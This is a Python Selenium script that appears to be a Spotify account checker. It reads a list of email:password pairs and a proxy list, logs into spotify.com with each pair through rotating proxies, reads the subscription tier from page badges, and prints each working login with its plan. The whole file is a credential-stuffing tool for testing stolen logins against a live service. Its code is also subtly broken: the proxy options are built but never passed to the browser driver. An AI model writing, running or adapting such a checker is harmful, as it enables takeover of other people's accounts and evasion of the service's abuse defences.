import time
from selenium.common import NoSuchElementException
from selenium import webdriver
from selenium.webdriver.common.proxy import Proxy, ProxyType
from selenium.webdriver.edge.service import Service
from selenium.webdriver.edge.options import Options

PATH = "Driver Path"
PROXY_FILE = "Proxy Path"
ACCOUNT_FILE = "Account Path"

# Read the proxy file and extract the proxy addresses
with open(PROXY_FILE, 'r') as file:
    proxies = file.read().splitlines()

with open(ACCOUNT_FILE, 'r', encoding='utf-8', errors='replace') as file:
    accounts = file.read().splitlines()

premium_plans = {
    "Individual Premium": "individual-badge",
    "Family Premium": "family-badge",
    "Student Premium": "student-badge",
    "Duo Premium": "duo-badge",
    "Spotify Free": "free-badge",
    "Spotify Premium": "premium-badge"
}

for account in accounts:
    email, password = account.split(':')
    account_type = "None"
    proxy_found = False

    for proxy_address in proxies:
        # Proxy configuration
        proxy_host, proxy_port = proxy_address.split(':')

        # Create a new Proxy object
        proxy = Proxy()
        proxy.proxy_type = ProxyType.MANUAL
        proxy.http_proxy = f"{proxy_host}:{proxy_port}"
        proxy.ssl_proxy = f"{proxy_host}:{proxy_port}"
        proxy.socks_proxy = f"{proxy_host}:{proxy_port}"
        proxy.socks_version = 5

        proxy = Proxy({
            'proxyType': ProxyType.MANUAL,
            'httpProxy': proxy_address,
            'sslProxy': proxy_address,
            'noProxy': ''
        })

        options = Options()
        options.proxy = proxy

        # Set the path to the msedgedriver executable in the system PATH environment variable
        webdriver.EdgeOptions().set_capability("platform", "windows")
        webdriver.EdgeOptions().set_capability("ms:edgeOptions", options)
        webdriver.EdgeOptions().add_argument(f"--driver-path={PATH}")

        # Start the WebDriver without specifying the options
        driver = webdriver.Edge()

        driver.get("https://spotify.com/login")
        time.sleep(1.5)
        driver.find_element("id", "login-username").send_keys(email)
        driver.find_element("id", "login-password").send_keys(password)
        driver.find_element("id", "login-button").click()

        time.sleep(1.5)

        for plan_name, plan_badge in premium_plans.items():
            try:
                plan_badge_element = driver.find_element("class name", plan_badge)
                account_type = plan_name
                proxy_found = True
                break
            except NoSuchElementException:
                proxy_found = True
                pass

        print(f"Account: {email}:{password} - Proxy: {proxy_address} - Spotify {account_type}")

        driver.quit()

        if proxy_found:
            break

    if account_type != "None":
        continue
